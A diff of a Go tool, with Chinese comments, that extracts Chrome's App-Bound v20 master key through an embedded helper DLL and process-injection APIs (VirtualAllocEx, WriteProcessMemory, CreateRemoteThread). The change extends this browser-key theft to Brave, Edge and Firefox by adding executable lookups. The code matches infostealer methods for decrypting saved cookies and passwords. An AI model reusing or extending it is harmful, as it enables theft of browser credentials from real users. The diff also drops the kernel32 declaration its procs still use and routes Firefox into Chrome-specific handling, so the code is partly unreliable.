@@ -37,7 +37,6 @@ const (
 )
 
 var (
-	kernel32               = windows.NewLazySystemDLL("kernel32.dll")
 	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
 	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
@@ -49,15 +48,20 @@ var abeHelperDLL []byte
 
 // retrieveV20Key 读取 Chrome App-Bound v20 主密钥
 func retrieveV20Key(chromeRoot string) ([]byte, error) {
-	encrypted, err := readAppBoundCiphertext(chromeRoot)
+	return retrieveV20KeyForBrowser(BrowserChrome, chromeRoot)
+}
+
+// retrieveV20KeyForBrowser 读取指定浏览器 App-Bound v20 主密钥
+func retrieveV20KeyForBrowser(browser string, root string) ([]byte, error) {
+	encrypted, err := readAppBoundCiphertext(root)
 	if err != nil {
 		return nil, err
 	}
-	chromePath, err := findChromeExecutable()
+	browserPath, err := findBrowserExecutable(browser)
 	if err != nil {
 		return nil, err
 	}
-	return decryptAppBoundCiphertext(chromePath, encrypted)
+	return decryptAppBoundCiphertext(browserPath, encrypted)
 }
 
 // readAppBoundCiphertext 从 Local State 提取 APPB 密文
@@ -88,10 +92,26 @@ func readAppBoundCiphertext(chromeRoot string) ([]byte, error) {
 	return decoded[len(appBoundPrefix):], nil
 }
 
+// findBrowserExecutable 定位指定浏览器可执行文件
+func findBrowserExecutable(browser string) (string, error) {
+	switch strings.ToLower(strings.TrimSpace(browser)) {
+	case BrowserChrome, "":
+		return findChromeExecutable()
+	case BrowserBrave:
+		return findBraveExecutable()
+	case BrowserEdge:
+		return findEdgeExecutable()
+	case BrowserFirefox:
+		return findFirefoxExecutable()
+	default:
+		return "", fmt.Errorf("未知浏览器: %s", browser)
+	}
+}
+
 // findChromeExecutable 定位稳定版 Chrome 可执行文件
 func findChromeExecutable() (string, error) {
 	for _, root := range []registry.Key{registry.CURRENT_USER, registry.LOCAL_MACHINE} {
-		path, err := chromeExecutableFromRegistry(root)
+		path, err := executableFromRegistry(root, "chrome.exe")
 		if err == nil {
 			return path, nil
 		}
@@ -104,9 +124,57 @@ func findChromeExecutable() (string, error) {
 	return "", fmt.Errorf("找不到 chrome.exe")
 }
 
-// chromeExecutableFromRegistry 读取 Windows App Paths
-func chromeExecutableFromRegistry(root registry.Key) (string, error) {
-	key, err := registry.OpenKey(root, `SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe`, registry.QUERY_VALUE)
+// findBraveExecutable 定位稳定版 Brave 可执行文件
+func findBraveExecutable() (string, error) {
+	for _, root := range []registry.Key{registry.CURRENT_USER, registry.LOCAL_MACHINE} {
+		path, err := executableFromRegistry(root, "brave.exe")
+		if err == nil {
+			return path, nil
+		}
+	}
+	for _, path := range braveExecutableFallbacks() {
+		if fileInfo, err := os.Stat(path); err == nil && !fileInfo.IsDir() {
+			return path, nil
+		}
+	}
+	return "", fmt.Errorf("找不到 brave.exe")
+}
+
+// findEdgeExecutable 定位稳定版 Edge 可执行文件
+func findEdgeExecutable() (string, error) {
+	for _, root := range []registry.Key{registry.CURRENT_USER, registry.LOCAL_MACHINE} {
+		path, err := executableFromRegistry(root, "msedge.exe")
+		if err == nil {
+			return path, nil
+		}
+	}
+	for _, path := range edgeExecutableFallbacks() {
+		if fileInfo, err := os.Stat(path); err == nil && !fileInfo.IsDir() {
+			return path, nil
+		}
+	}
+	return "", fmt.Errorf("找不到 msedge.exe")
+}
+
+// findFirefoxExecutable 定位 Firefox 可执行文件
+func findFirefoxExecutable() (string, error) {
+	for _, root := range []registry.Key{registry.CURRENT_USER, registry.LOCAL_MACHINE} {
+		path, err := executableFromRegistry(root, "firefox.exe")
+		if err == nil {
+			return path, nil
+		}
+	}
+	for _, path := range firefoxExecutableFallbacks() {
+		if fileInfo, err := os.Stat(path); err == nil && !fileInfo.IsDir() {
+			return path, nil
+		}
+	}
+	return "", fmt.Errorf("找不到 firefox.exe")
+}
+
+// executableFromRegistry 读取 Windows App Paths
+func executableFromRegistry(root registry.Key, exeName string) (string, error) {
+	key, err := registry.OpenKey(root, `SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\`+exeName, registry.QUERY_VALUE)
 	if err != nil {
 		return "", err
 	}
@@ -115,17 +183,17 @@ func chromeExecutableFromRegistry(root registry.Key) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	value = strings.TrimSpace(value)
+	value = strings.Trim(strings.TrimSpace(value), "\"")
 	if value == "" {
-		return "", fmt.Errorf("Chrome App Paths 为空")
+		return "", fmt.Errorf("%s App Paths 为空", exeName)
 	}
 	if fileInfo, err := os.Stat(value); err != nil || fileInfo.IsDir() {
-		return "", fmt.Errorf("Chrome App Paths 不可用")
+		return "", fmt.Errorf("%s App Paths 不可用", exeName)
 	}
 	return value, nil
 }
 
-// chromeExecutableFallbacks 返回常见安装位置
+// chromeExecutableFallbacks 返回 Chrome 常见安装位置
 func chromeExecutableFallbacks() []string {
 	paths := make([]string, 0, 3)
 	if programFiles := strings.TrimSpace(os.Getenv("ProgramFiles")); programFiles != "" {
@@ -136,6 +204,51 @@ func chromeExecutableFallbacks() []string {
 	}
 	if localAppData := strings.TrimSpace(os.Getenv("LOCALAPPDATA")); localAppData != "" {
 		paths = append(paths, filepath.Join(localAppData, "Google", "Chrome", "Application", "chrome.exe"))
+	}
+	return paths
+}
+
+// braveExecutableFallbacks 返回 Brave 常见安装位置
+func braveExecutableFallbacks() []string {
+	paths := make([]string, 0, 3)
+	if programFiles := strings.TrimSpace(os.Getenv("ProgramFiles")); programFiles != "" {
+		paths = append(paths, filepath.Join(programFiles, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"))
+	}
+	if programFilesX86 := strings.TrimSpace(os.Getenv("ProgramFiles(x86)")); programFilesX86 != "" {
+		paths = append(paths, filepath.Join(programFilesX86, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"))
+	}
+	if localAppData := strings.TrimSpace(os.Getenv("LOCALAPPDATA")); localAppData != "" {
+		paths = append(paths, filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"))
+	}
+	return paths
+}
+
+// edgeExecutableFallbacks 返回 Edge 常见安装位置
+func edgeExecutableFallbacks() []string {
+	paths := make([]string, 0, 3)
+	if programFilesX86 := strings.TrimSpace(os.Getenv("ProgramFiles(x86)")); programFilesX86 != "" {
+		paths = append(paths, filepath.Join(programFilesX86, "Microsoft", "Edge", "Application", "msedge.exe"))
+	}
+	if programFiles := strings.TrimSpace(os.Getenv("ProgramFiles")); programFiles != "" {
+		paths = append(paths, filepath.Join(programFiles, "Microsoft", "Edge", "Application", "msedge.exe"))
+	}
+	if localAppData := strings.TrimSpace(os.Getenv("LOCALAPPDATA")); localAppData != "" {
+		paths = append(paths, filepath.Join(localAppData, "Microsoft", "Edge", "Application", "msedge.exe"))
+	}
+	return paths
+}
+
+// firefoxExecutableFallbacks 返回 Firefox 常见安装位置
+func firefoxExecutableFallbacks() []string {
+	paths := make([]string, 0, 3)
+	if programFiles := strings.TrimSpace(os.Getenv("ProgramFiles")); programFiles != "" {
+		paths = append(paths, filepath.Join(programFiles, "Mozilla Firefox", "firefox.exe"))
+	}
+	if programFilesX86 := strings.TrimSpace(os.Getenv("ProgramFiles(x86)")); programFilesX86 != "" {
+		paths = append(paths, filepath.Join(programFilesX86, "Mozilla Firefox", "firefox.exe"))
+	}
+	if localAppData := strings.TrimSpace(os.Getenv("LOCALAPPDATA")); localAppData != "" {
+		paths = append(paths, filepath.Join(localAppData, "Mozilla Firefox", "firefox.exe"))
 	}
 	return paths
 }
